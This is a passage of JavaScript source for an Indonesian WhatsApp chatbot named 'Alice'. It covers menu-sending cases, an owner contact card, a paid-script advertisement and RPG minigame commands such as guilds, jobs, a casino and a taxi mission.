    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicet,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "islamimenu": 
const Aliceis = `${global.islamimenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Aliceis,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "downloadermenu": 
const Alicedown = `${global.downloadermenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicedown,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "premiummenu": 
const Aliceprem = `${global.premiummenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Aliceprem,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "searchmenu": 
const Alicesear = `${global.searchmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicesear,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "ephotomenu": 
const Aliceeph = `${global.ephotomenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Aliceeph,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "primbonmenu": 
const Aliceprim = `${global.primbonmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Aliceprim,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "randommenu": 
const Alicerand = `${global.randommenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicerand,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "groupmenu": 
const Alicegroup = `${global.groupmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicegroup,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "ownermenu": 
const Aliceown = `${global.ownermenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Aliceown,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "rpgmenu": 
const Alicerpg = `${global.rpgmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicerpg,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "gamemenu": 
const Alicegame = `${global.gamemenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicegame,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Command Owner Prefix
case 'owner': case 'botowner':
let namaown = `${ownername}`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${ownername}\nitem1.TEL;waid=${global.owner}:+${global.owner}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:${ownername}\nX-WA-BIZ-NAME: ${ownername}\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
Alice.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//Source Code

case 'sc':
case 'script':
case 'scrip': {
let teks = `
Script ${botname} ${version}


— *Preview Feature*
- Rpg
- Antilink 30++
- Menu Simpel Rapih
- Jaga group
- Downloader
- Search
- Sticker Qc
- Stcker Brat
- Sticker Meme
- Sticker Bratvideo
- Support Button New/Old
- Game
- Werewolf
- Tebak Bendera
- Tebak Kata
- Tebak Lirik
- Tebak Lagu
- Pin Search
- Pin Download
- Play Music
- Downloader Yt Mp3/4
- Order Kuota Gateway
- User Banned
- Warn Fitur
- Pushkontak
- SVkontak
- Jpm
- Create Panel
- Antipromosi
- Setprefix
- BotSet
- 770+ Fitur
- Type Case X Plugins
- Dan lain lain, review sendiri

*— Benefit?*
- Free req Fitur ( 3 )
- Free Update
- Free Acces
- Free Fix Error
- Dapat Group Update
- Anti Bekdor
- Bebas Rename
- Update Setiap Hari
- No Enc 95% ( Index Enc )

— *Price*
- Free Update 3x Version: IDR 30.000
- Free Update Permanen: IDR 50,000

 - *_MINAT?? Pv_*
 https://wa.me/6281543496975

 - _*RAGU? TESTI ↓*_
https://whatsapp.com/channel/0029VamvtL2ADTO7ikBeNe1E

 - _*Group Bot Whatsapp*_
https://chat.whatsapp.com/IJx5bkPvivUCeai7d2ChRC

 - *_Bebas Share Link_*
https://chat.whatsapp.com/HplCMdQnR2PIKCFJJ7Zgob`

const bet = {
title: "Owner",
sections: [
{
title: `Owner`, 
highlight_label: ``,
rows: [
{
title: `Owner ( ${ownername} )`,
description: "Jangan Di Spam Ya",
id: `${Xyroo}owner`,
},
]},
]};
xreplyx(m.chat, teks, bet, m);
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//        
// RPG Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'joinrpg': {  
if (isBan) return Xban()
await xreaction()
                fs.readFile('./AliceSystem/AliceRpg/join.json', 'utf8', (err, data) => {
                    if (err) {
                        console.error(err);                        
                    }
                    let users;                   
try {
                        users = JSON.parse(data);
                    } catch (parseError) {
                        console.error('Err:', parseError);                        
                    }                
                    const userExists = users.some(user => user.id === m.sender);

                    if (userExists) {
                        return ReplyRynzz('Kamu sudah Join.');
                    }              
                    users.push({ id: m.sender  });

fs.writeFile('./AliceSystem/AliceRpg/join.json', JSON.stringify(users, null, 2), 'utf8', (err) => {
                        if (err) {
                            console.error(err);                            
                        } else {
                            return ReplyRynzz('Sukses Join  Rpg!');
                        }
                    });
                });
}
                break;

 case "myguild": {         
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 const showMyGuild = (userId, m) => {
    const guildIdc = userGuilds[userId];
    if (!guildIdc) {
        return ReplyRynzz("You are not a member of any guild.");
    }

    return showGuildInfo(guildIdc, m);
};
 showMyGuild(m.sender, m)
 }
 break
 
 case "guildinfo": {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!text) return ReplyRynzz(`[ Alice ] >> Masukan Nama guild`)
 const guildIdd = text
 getGuildInfo(text)
 }
 break
 
  case "delguild": {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!text) return ReplyRynzz(`[ Alice ] >> Masukan Nama guild`)
 deleteGuild(text, m.sender)
 }
 break
 
 case "joinguild": {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!text) return ReplyRynzz("Masukan Id Guild")
 const guildId = text
 joinGuild(guildId, m.sender)
 }
 break
 
 case "createguild": {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!text) return ReplyRynzz("Masukan Nama guild nya")
 const guildName = text
 createGuild(guildName, m.sender)
 }
 break
 
 case "listguild":
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 listGuilds()
 break                

case 'nebang': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds

return hours + " jam " + minutes + " menit " + seconds + " detik"
}
let user = db.data.users[m.sender]
let time = user.lastparming + 1800000
if (new Date - user.lastparming < 1800000) return ReplyRynzz(`Anda sudah lelah untuk bekerja\nTunggu selama ${msToTime(time - new Date())} lagi`)
let wood = `${Math.floor(Math.random() * 50)}`.trim()
let money = `${Math.floor(Math.random() * 50000)}`.trim()
user.wood += wood * 1
user.money += money * 1
user.lastparming = new Date * 1
ReplyRynzz(`Selamat kamu mendapatkan : \n+${wood} Kayu\n+${money} Money`)
}
break

case 'casino': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
let buatall = 1
Alice.casino = Alice.casino ? Alice.casino : {}
if (m.chat in Alice.casino) return reply ('Masih ada yang melakukan casino disini, tunggu sampai selesai!!')
else Alice.casino[m.chat] = true
try {
let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
let Aku = (randomaku * 1)
let Kamu = (randomkamu * 1)
let count = args[0]
count = count ? /all/i.test(count) ? Math.floor(db.data.users[m.sender].exp / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
count = Math.max(1, count)
if (args.length < 1) return ReplyRynzz('casino <jumlah>\n ' + 'casino 1000', )
if (db.data.users[m.sender].exp >= count * 1) {
db.data.users[m.sender].exp -= count * 1
//await ReplyRynzz('') //Kwkwwkkwlwlw
if (Aku > Kamu) {
ReplyRynzz(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You LOSE*\nKamu kehilangan ${count} Uang(xp)`)
} else if (Aku < Kamu) {
db.data.users[m.sender].exp += count * 2
ReplyRynzz(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You Win*\nKamu mendapatkan ${count * 2} Uang(xp)`)
} else {
db.data.users[m.sender].exp += count * 1
ReplyRynzz(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*SERI*\nKamu mendapatkan ${count * 1} Uang(xp)`)
}
} else ReplyRynzz(`Uang(xp) kamu tidak mencukupi untuk Casino silahkan *#kerja* terlebih dahulu!`)
} catch (e) {
console.log(e)
ReplyRynzz('Error!!')
if (DevMode) {
for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != Alice.user.jid)) {
Alice.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
}
}
} finally {
delete Alice.casino[m.chat]
}
}
break

case 'kerja':
case 'bekerja': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let type = (args[0] || '').toLowerCase()
let users = db.data.users[m.sender]
let time = users.lastkerja + 30000
let __timers = (new Date - users.lastkerja)
let _timers = (1000 - __timers)
let timers = clockString(_timers)

let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]

let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
let dagangan = daganga[Math.floor(Math.random() * daganga.length)]

let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
let pasien = pasie[Math.floor(Math.random() * pasie.length)]

let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
let panen = pane[Math.floor(Math.random() * pane.length)]

let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
let bengkel = bengke[Math.floor(Math.random() * bengke.length)]

let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
let rumah = ruma[Math.floor(Math.random() * ruma.length)]

if (/kerja/i.test(command)) {
switch (type) {
case 'ojek':
if (new Date - users.lastkerja < 300000) return ReplyRynzz(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
let hasilojek = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilojek * 1
users.lastparming = new Date * 1
ReplyRynzz(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} ${global.rpg.emoticon('money')}*`)
break

case 'pedagang':
if (new Date - users.lastkerja < 300000) return ReplyRynzz(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildagang = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildagang * 1
users.lastparming = new Date * 1
ReplyRynzz(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} ${global.rpg.emoticon('money')}*`)
break

case 'dokter':
if (new Date - users.lastkerja < 300000) return ReplyRynzz(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildokter = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildokter * 1
users.lastparming = new Date * 1
ReplyRynzz(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* ${global.rpg.emoticon('money')}`)
break

case 'petani':
if (new Date - users.lastkerja < 300000) return ReplyRynzz(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasiltani = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasiltani * 1
users.lastparming = new Date * 1
ReplyRynzz(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} ${global.rpg.emoticon('money')}*`)
break

case 'montir':
if (new Date - users.lastkerja < 300000) return ReplyRynzz(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilmontir = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilmontir * 1
users.lastparming = new Date * 1
ReplyRynzz(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* ${global.rpg.emoticon('money')}`)
break

case 'kuli':
if (new Date - users.lastkerja < 300000) return ReplyRynzz(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilkuli = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilkuli * 1
users.lastparming = new Date * 1
ReplyRynzz(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ${global.rpg.emoticon('money')}*`)
break
default:
return ReplyRynzz(`_*Pilih Pekerjaan Yang Kamu Inginkan*_\n\n_• Kuli_ \n_• Montir_ \n_• Petani_ \n_• Dokter_ \n_• Pedagang_ \n_• Ojek_ \n\nContoh Penggunaan :\nkerja Kuli`)
}
}
}
break

case 'bankcek': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? Alice.user.jid: m.sender
if (!(who in db.data.users)) return ReplyRynzz(`User ${who} not in database`)
let user = db.data.users[who]
let isMods = global.owner.filter(([number, _, isOwner]) => number && isOwner).map(([number]) => number).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isPrems = isOwner || new Date() - user.premiumTime < 0
let caption = `
▧「 *BANK CEK* 」
┃ •  👤 Name: ${user.registered ? user.name: Alice.getName(m.sender)}
┃ •  ${global.rpg.emoticon('atm')} Atm: ${user.atm > 0 ? 'Level ' + user.atm: '✖️'}
┃ •  ${global.rpg.emoticon('bank')} Bank: ${user.bank} / ${user.fullatm}
┃ •  ${global.rpg.emoticon('money')} Money: ${user.money}
┃ •  ${global.rpg.emoticon('chip')} Chip: ${user.chip}
┃ •  🤖 Robo: ${user.robo > 0 ? 'Level ' + user.robo: '✖️'}
┃ •  🌟 Status: ${isMods ? 'Developer' : isOwner ? 'Owner' : isPrems ? 'Premium User ✅' : user.level > 999 ? 'Elite User' : 'Free User'}
┃ •  📑 Registered: ${user.registered ? 'Yes': 'No'}
└────···
`.trim()
ReplyRynzz(`${caption}`)
}
break

case 'bansos': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}

function clockString(ms) {
let h = Math.floor(ms / 3600000);
let m = Math.floor(ms / 60000) % 60;
let s = Math.floor(ms / 1000) % 60;
return [h, m, s].map(v => v.toString().padStart(2, '0')).join(':');
}

let user = db.data.users[m.sender];
let randomaku = Math.floor(Math.random() * 101);
let randomkamu = Math.floor(Math.random() * 101);
let __timers = new Date() - user.lastbansos;
let _timers = 360 - __timers;
let timers = clockString(_timers);

if (user.money < 1000) {
return ReplyRynzz(`Uang Anda Harus Diatas Seribu Untuk Menggunakan Command Ini`);
}

if (new Date() - user.lastbansos > 300000) {
if (randomaku > randomkamu) {
user.money -= 3000000;
user.lastbansos = new Date() * 1;
return Alice.sendMessage(m.chat, {
image: { url: 'https://telegra.ph/file/afcf9a7f4e713591080b5.jpg' },
caption: `Kamu Tertangkap Setelah Kamu korupsi dana bansos🕴️💰,Dan Kamu harus membayar denda 3 Juta rupiah💵`
});
} else if (randomaku < randomkamu) {
user.money += 3000000;
user.lastbansos = new Date() * 1;
return Alice.sendMessage(m.chat, {
image: { url: 'https://telegra.ph/file/d31fcc46b09ce7bf236a7.jpg' },
caption: `Kamu berhasil korupsi dana bansos🕴️💰,Dan Kamu mendapatkan 3 Juta rupiah💵`
});
} else {
user.lastbansos = new Date() * 1;
return ReplyRynzz(`Sorry Gan Lu g Berhasil Korupsi bansos Dan Tidak masuk penjara karna Kamu *melarikan diri🏃*`);
}
} else {
return ReplyRynzz(`Silahkan Menunggu Beberapa Menit Untuk bansos Lagi`);
}
}
break;


case 'taxy': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let order = db.data.users[m.sender].ojekk
let timers = clockString(_timers)
let name = Alice.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Taxy'
Alice.misi = Alice.misi ? Alice.misi : {}
if (id in Alice.misi) {
ReplyRynzz(`Selesaikan Misi ${Alice.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (new Date - user.lastmisi > 3600000) {
let randomaku1 = Math.floor(Math.random() * 1000000)
let randomaku2 = Math.floor(Math.random() * 10000)

var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️ 🚕


✔️ Mendapatkan orderan....
`.trim()

var dimas2 = `
🚶⬛⬛⬛⬛⬛🚐⬛⬛⬛🚓🚚
🚖⬜⬜⬜⬛⬜⬜⬜🚓⬛🚑
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚙
🏘️🏘️🏢️🌳🌳 🏘️🏘️🏡


🚖 Mengantar Ke tujuan.....
`.trim()

var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚓
⬛⬜🚗⬜⬜⬛⬜🚐⬜⬜⬛🚙🚚🚑
⬛⬛⬛⬛🚒⬛⬛⬛⬛⬛⬛🚚
🏘️🏘️🏘️🏘️🌳🌳 🏘️


🚖 Selesai Mengantar Pelanggan....
`.trim()

var dimas4 = `
➕ 💹Menerima gaji....
`.trim()

var hsl = `
*—[ Hasil Taxy ${name} ]—*
➕ 💹 Uang = [ ${randomaku1} ]
➕ ✨ Exp = [ ${randomaku2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

user.money += randomaku1
user.exp += randomaku2
user.ojekk += 1

Alice.misi[id] = [
kerja,
setTimeout(() => {
delete Alice.misi[id]
}, 27000)
]

setTimeout(() => {
ReplyRynzz(`${hsl}`)
}, 27000)

setTimeout(() => {
ReplyRynzz(`${dimas4}`)
}, 25000)

setTimeout(() => {
ReplyRynzz(`${dimas3}`)
}, 20000)

setTimeout(() => {
ReplyRynzz(`${dimas2}`)
}, 15000)

setTimeout(() => {
ReplyRynzz(`${dimas}`)
}, 10000)

setTimeout(() => {
ReplyRynzz('🔍Mencari pelanggan.....')
}, 0)
user.lastmisi = new Date * 1
} else ReplyRynzz(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

